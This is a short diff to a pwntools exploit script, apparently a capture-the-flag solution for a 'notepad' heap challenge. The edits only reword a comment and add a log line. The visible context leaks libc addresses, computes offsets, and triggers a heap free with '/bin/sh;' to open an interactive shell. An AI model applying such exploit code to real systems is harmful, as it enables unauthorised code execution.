@@ -179,7 +179,7 @@ def exploit(p, mode, libc):
     log.info(f"libc_leak: 0x{libc_leak:016x}")
 
     # Get address of notepad from libc
-    notepad_leak = read_64(libc_leak - 0xcf0) # This is the offset to a ref to notepad
+    notepad_leak = read_64(libc_leak - 0xcf0) # This is the offset to a pointer to notepads stdin
     log.debug(f"notepad_leak: 0x{notepad_leak:016x}")
 
     notepad_leak -= 0x203030
@@ -204,6 +204,7 @@ def exploit(p, mode, libc):
     # trigger free
     notebook_pick(p, 5)
     tab_add(p, "boom", "/bin/sh;", 0x10)
+    log.info("Starting shell")
     tab_delete(p, 1, False)
 
     p.interactive()
